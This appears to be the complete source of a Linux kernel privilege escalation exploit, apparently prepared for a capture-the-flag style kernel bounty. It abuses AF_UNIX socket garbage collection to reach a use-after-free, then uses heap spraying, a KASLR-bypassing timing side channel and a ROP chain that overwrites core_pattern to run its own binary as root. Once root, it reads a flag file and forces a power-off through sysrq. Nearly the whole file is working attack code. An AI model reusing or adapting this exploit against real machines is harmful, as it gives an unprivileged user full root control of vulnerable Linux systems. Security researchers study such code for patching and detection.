/*  fd_cycle_exploit.c  –  Linux kernel exploitation demo
 *  - AF_UNIX only
 *  - socketpair() for all connections
 *  - Exact cyclic reference (0x400 pairs → 0x800 fds)
 *  - Self-pass: send_fd(skX, skX)
 *  - All 9 steps in strict order
 *
 *  Compile:  gcc -Wall -Wextra -O2 fd_cycle_exploit.c -o fd_cycle_exploit
 *  Run:      ./fd_cycle_exploit
 *
 *  Author: @Peterpan980927 (sg) – 2025-11-11
 */

// loop count, NUM cylic, C_CACHE PIPE, NUM_PAGE matters, can't be too much


#include <stdint.h>
#include <sched.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/un.h>
#include <errno.h>
#include <err.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <err.h>
#include <stdbool.h>
#include <sched.h>
#include <xdk/core.h>
#include <xdk/postrip.h>

INCBIN(target_db, "target_db.kxdb");


#define PIPE 0x400
#define NUM_PAGE 0x20
int pipefd[PIPE][2];

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t
size_t leak_kaslr(u64 base);

char buf[0x8000];
size_t tmp;
size_t unix_graph_grouped =  0xffffffff84f28e00;
size_t unix_graph_maybe_cyclic = 0xffffffff84f28e01;
void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

#define Dprintf(fmt, ...)
#define TPAUSE {int x;read(0,&x,1);}
#define PAUSE usleep(100);
#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

void spray_cross_cache_skb_buffers(Target& target, uint64_t kbase);
void setup_cross_cache_sk();
int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	// send our binary to memfd for core_pattern payload
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	// our binary now at file descriptor 666
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}


/* Send one FD */
static void send_fd(int sock, int fd_to_send)
{
    struct msghdr msg = {0};
    struct iovec iov[1];
    char buf[1] = {'\0'};
    char cmsgbuf[CMSG_SPACE(sizeof(int))];

    iov[0].iov_base = buf;
    iov[0].iov_len = 1;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd_to_send;

    SYSCHK(sendmsg(sock, &msg, 0));
}

/* Receive one FD */
static int recv_fd(int sock)
{
    struct msghdr msg = {0};
    struct iovec iov[1];
    char buf[1];
    char cmsgbuf[CMSG_SPACE(sizeof(int))];

    iov[0].iov_base = buf;
    iov[0].iov_len = 1;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    SYSCHK(recvmsg(sock, &msg, 0));

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (!cmsg || cmsg->cmsg_type != SCM_RIGHTS)
        err(1, "no fd received");
    return *(int *)CMSG_DATA(cmsg);
}

/* ============================================================= */

#define PAYLOAD_SPRAY_PAGES 0x10
#define PAGE_SIZE 0x1000
#define TOTAL_ALLOCATION (PAGE_SIZE * PAYLOAD_SPRAY_PAGES)
#define SPRAY_SIZE (3UL*1024*1024*1024 + 1024*1024*128)

// 0xffffffff81961665: push rdi; jmp qword ptr [rbp+0x48];
// 0xffffffff82dcfe22: pop rsp; ret;
// 0xffffffff82ddb3eb: pop rdi; ret;
// 0xffffffff839191df: pop rsp; pop r13; pop r14; pop r15; pop rbp; ret;
// 0xffffffff819427d9 : mov qword ptr [rdi], rsi ; xor eax, eax ; jmp 0xffffffff82843b70

char core[] = "|/proc/%P/fd/666 %P";

char skb[0x1000];

#define STEXT 0xffffffff81000000UL

#define ADD_RSP_F0 			(kbase + (0xffffffff82528fb0UL - STEXT)) 
/*
   0xffffffff82528fb0 <recent_mt_check_v0+192>: add    rsp,0xf0
   0xffffffff82528fb7 <recent_mt_check_v0+199>: jmp    0xffffffff82843b70 <__x86_return_thunk>
*/

#define PIVOT_STACK_RBX		(kbase + (0xffffffff817059d3UL - STEXT))
/*
   0xffffffff817059d3 <ff_layout_encode_io_latency+163>:        push   rbx
   0xffffffff817059d4 <ff_layout_encode_io_latency+164>:        or     BYTE PTR [rbx+0x41],bl
   0xffffffff817059d7 <ff_layout_encode_io_latency+167>:        pop    rsp
   0xffffffff817059d8 <ff_layout_encode_io_latency+168>:        pop    r13
   0xffffffff817059da <ff_layout_encode_io_latency+170>:        pop    r14
   0xffffffff817059dc <ff_layout_encode_io_latency+172>:        pop    rbp
   0xffffffff817059dd <ff_layout_encode_io_latency+173>:        jmp    0xffffffff82843b70 <__x86_return_thunk>
*/

// novel technique
void nperm_rop_payload(Target& target, uint64_t kbase){

    size_t KNOWN_ADDR = kbase + target.GetSymbolOffset("__init_begin");
    size_t core_pattern = kbase + target.GetSymbolOffset("core_pattern");
    
    *(size_t*)&skb[target.GetFieldOffset("sk_buff","next")] = KNOWN_ADDR;
    *(size_t*)&skb[target.GetFieldOffset("sk_buff","prev")] = KNOWN_ADDR;
    *(size_t*)&skb[16] = 0x4242424242; // rbp
    *(size_t*)&skb[24] = ADD_RSP_F0;
    *(int*)&skb[target.GetFieldOffset("sk_buff","users")] = 1;
	*(size_t*)&skb[target.GetFieldOffset("sk_buff","destructor")] = PIVOT_STACK_RBX;

    RopChain Rop(target, kbase);


    for(int i=0;i<strlen(core);i+=8){
        Rop.AddRopAction(RopActionId::WRITE_WHAT_WHERE_64, {core_pattern+i, *(size_t*)&core[i]});
    }
    Rop.AddRopAction(RopActionId::MSLEEP, {0x10000000});
    memcpy(&skb[0x110],Rop.GetData().data(),Rop.GetData().size());

    char* mem = (char*)mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
    for(size_t i=0;i<SPRAY_SIZE;i+=0x1000){
        memcpy((void*)&mem[i],skb,0x1000);
    }

    madvise(mem,SPRAY_SIZE,MADV_FREE);

    mem = (char*)mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);

    for(size_t i=0;i<SPRAY_SIZE;i+=0x1000){
        memcpy((void*)&mem[i],skb,0x1000);
    }

    munmap(mem,SPRAY_SIZE);


}

// spray to make new vertex->scc_index is 2
void spray_scc_index() {
#define N 0x200
	int seq[2 * N], rev[2 * N];
    int victim_fd[2];

	for (int loop = 0; loop < 0x20 ;loop++) {
			for (int i = 0; i < N; i++)
			{
				SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, victim_fd));
				seq[i * 2 + 0] = victim_fd[0];
				seq[i * 2 + 1] = victim_fd[1];
				rev[i * 2 + 0] = victim_fd[1];
				rev[i * 2 + 1] = victim_fd[0];
			}

			for (int i = 0; i < 2 * N - 1; i++)
			{
				send_fd(rev[i + 1], seq[i]);
			}

			send_fd(rev[0], seq[2 * N - 1]);

			/* 1-b: close() all sockets */

			for (int i = 0; i < 2 * N; i++)
			{
				close(seq[i]);
				close(rev[i]);
			}
			
			/* 1-c: create socket and close */

			for (int i = 0 ; i < 0x1 ; i++) {
					SYSCHK(tmp = socket(AF_UNIX, SOCK_STREAM, 0));
					close(tmp);
			}
	}
}

int exploit(Target& target, uint64_t kbase)
{

    /* ============================================================= */
    /* 1-a: Create single cyclic reference with many sockets */
    setvbuf(stdout, 0, 2, 0);
	set_cpu(0);	
    struct rlimit rlim = {.rlim_cur = 0x1000, .rlim_max = 0x1000};
    SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));



	spray_scc_index();

	struct sockaddr_un addrB = {};
    addrB.sun_family = AF_UNIX;
    addrB.sun_path[0] = '\0';
    strcpy(&addrB.sun_path[1], "embryo_listener");

    size_t addrB_len = offsetof(struct sockaddr_un, sun_path) + 1 + strlen("embryo_listener");
    int embryo_skB = socket(AF_UNIX, SOCK_STREAM, 0);
    SYSCHK(bind(embryo_skB, (struct sockaddr *)&addrB, addrB_len));
    SYSCHK(listen(embryo_skB, 1));
    int client_to_B = socket(AF_UNIX, SOCK_STREAM, 0);
    SYSCHK(connect(client_to_B, (struct sockaddr *)&addrB, addrB_len));
	
	sleep(1);

    /* ============================================================= */
    /* 2-a: Pass sk-A to an embryo sk-B */

	// 0
	int skA_pair[2];
    SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,skA_pair));
	int sk_A = skA_pair[0];
	
#define C_CACHE 0x200
	int cross[C_CACHE][2];
	int victim_slab[16][2];
	for(int i=0;i<C_CACHE;i++)
		SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,cross[i]));
	for(int i=0;i<16;i++)
		SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,victim_slab[i]));

	for(int i=0;i<C_CACHE;i++)
		SYSCHK(send(cross[i][0],buf,1,0));
// cross-cache
	for(int i=0;i<16;i++)
		SYSCHK(send(victim_slab[i][0],buf,1,0));

	SYSCHK(send(skA_pair[1],buf,1,MSG_OOB));

	for(int i=0;i<16;i++)
		SYSCHK(send(victim_slab[i][1],buf,1,0));

// cross-cache
	for(int i=0;i<C_CACHE;i++)
        SYSCHK(send(cross[i][1],buf,1,0));

	send_fd(client_to_B, sk_A);

    /* 2-b: Pass sk-X to sk-X → send_fd(skX, skX) */


    int skX[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skX));

    // send_fd(skX[0], skX[0]) — TRUE self-pass
    send_fd(skX[1], skX[0]);

    /* 2-c: create socket and close */

	for (int i = 0 ; i < 0x1 ; i++) {
			SYSCHK(tmp = socket(AF_UNIX, SOCK_STREAM, 0));
			close(tmp);
	}
    // wait for GC
     sleep(1);



    /* ============================================================= */
    /* 3-a: accept() the embryo sk-B */


    int skB_accepted = SYSCHK(accept(embryo_skB, NULL, NULL));

    /* 3-b: Pass sk-B to sk-C */


    int skC[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skC));
    send_fd(skC[0], skB_accepted); // skB_accepted sends original skB

    /* 3-c: close() the in-flight sk-A */

    close(sk_A);
    /* 3-d: create socket and close */


	setup_cross_cache_sk();

	memset(buf,0x0,0x1000);
	
	// recv all skb in the same slab
	for(int i=0;i<C_CACHE;i+=2){

		SYSCHK(recv(cross[i][0],buf,1,0));
	} 

	for(int i=0;i<16;i++){

		SYSCHK(recv(victim_slab[i][0],buf,1,0));
	} 

	SYSCHK(tmp = socket(AF_UNIX, SOCK_STREAM, 0));
	close(tmp); 

        // wait for GC
    sleep(1);

	for(int i=0;i<C_CACHE;i+=2){

		SYSCHK(recv(cross[i][1],buf,1,0));
	} 

	for(int i=0;i<16;i++){
		SYSCHK(recv(victim_slab[i][1],buf,1,0));
	} 

	spray_cross_cache_skb_buffers(target, kbase);


	sk_A = recv_fd(skB_accepted);
	// recv to trigger destructor of oob_skb->prev to do ROP chain and get root
	SYSCHK(recv(sk_A,buf,1,MSG_OOB));

	

    return 0;
}

void setup_cross_cache_sk() {
	for(int i=0;i<PIPE;i++) {
		SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,pipefd[i]));
		size_t val = 0x400000;
		// make socket can spray large
		SYSCHK(SYSCHK(setsockopt(pipefd[i][0], SOL_SOCKET,SO_SNDBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(pipefd[i][1], SOL_SOCKET,SO_SNDBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(pipefd[i][0], SOL_SOCKET,SO_RCVBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(pipefd[i][1], SOL_SOCKET,SO_RCVBUF, &val, 4)));
		SYSCHK(write(pipefd[i][1],buf,1));
		SYSCHK(write(pipefd[i][1],buf,1));
		SYSCHK(write(pipefd[i][1],buf,1));
		SYSCHK(write(pipefd[i][1],buf,1));

	}
}

void spray_cross_cache_skb_buffers(Target& target, uint64_t kbase) {
    size_t KNOWN_ADDR;
	KNOWN_ADDR = kbase + 0x4103000;

#define PER_SKB 0x100
#define SKB_NEXT 0
#define SKB_PREV 8
#define SKB_HEAD 208
#define SKB_LEN 112
	memset(buf,0, sizeof(buf));
	for(int i=0 ;i < sizeof(buf)/PER_SKB ; i++){
		*(size_t*)&buf[i * PER_SKB + SKB_NEXT] = KNOWN_ADDR;
		*(size_t*)&buf[i * PER_SKB + SKB_PREV] = KNOWN_ADDR;

		*(size_t*)&buf[i * PER_SKB + SKB_HEAD] = KNOWN_ADDR;
		*(int*)&buf[i * PER_SKB + SKB_LEN] = 1;
	}


	for(int i=0;i<PIPE;i++){
		size_t tmp;
		read(pipefd[i][0],&tmp,4);
				for (int j = 0 ; j < NUM_PAGE ; j++)
			SYSCHK(write(pipefd[i][1],buf,0x1000)); //pipe write on 1 read on 0
	}




}


int main(int argc,char** argv){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);

	if (argc > 1)
	{
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag;echo o>/proc/sysrq-trigger");
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(1);
		setsid();
		crash((char *)"");
	}

    std::vector<uint8_t> db_data(&target_db[0], &target_db[target_db_size]);
    TargetDb kxdb(db_data);
    auto target = kxdb.AutoDetectTarget();
    target.AddSymbol("core_pattern", 0xffffffff84610900 - 0xffffffff81000000 );
    target.AddSymbol("__init_begin", 0xffffffff85103000 - 0xffffffff81000000 );
        target.AddStruct("sk_buff", 232, {
           {"next", 0, 8},
		   {"prev", 8, 8},
		   {"users", 220, 4},
		   {"destructor", 96, 8},
	});


    uint64_t kbase = 0;
	if(getenv("KTEXT"))
		kbase = strtoull(getenv("KTEXT"),0,16);
	else
		kbase = leak_kaslr(0);
    kbase &= (~0xffffffULL);


	nperm_rop_payload(target, kbase);


	setvbuf(stdout,0,2,0);
	
    int round = 0;
	while(1){
        printf("Round %d \n",round++);
		if(fork()==0){
			exploit(target, kbase);
			exit(0);
		}
		wait(0);
		sleep(1);
	}
}


inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
	uint64_t a, d;
	asm volatile("mfence\n\t"
				 "RDTSCP\n\t"
				 "mov %%rdx, %0\n\t"
				 "mov %%rax, %1\n\t"
				 "xor %%rax, %%rax\n\t"
				 "lfence\n\t"
				 : "=r"(d), "=r"(a)
				 :
				 : "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
	uint64_t a, d;
	asm volatile(
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"mfence\n\t"
		: "=r"(d), "=r"(a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

void prefetch(void *p)
{
	asm volatile(
		"prefetchnta (%0)\n"
		"prefetcht2 (%0)\n"
		: : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

//#define KASLR_BYPASS_INTEL
size_t leak_kaslr(u64 base)
{
    if (!base)
    {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000001000000ull
        while (1)
        {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
                {
                    if (times[ti] < minv)
                    {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0)
                {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                base -= OFFSET;
                goto got_base;
            }


        }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

        while (1)
        {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
                {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++)
                    {
                        sum += times[ti + i];
                    }
                    if (sum > max)
                    {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                goto got_base;
            }


        }
#endif
    }

got_base:



    return base;
}



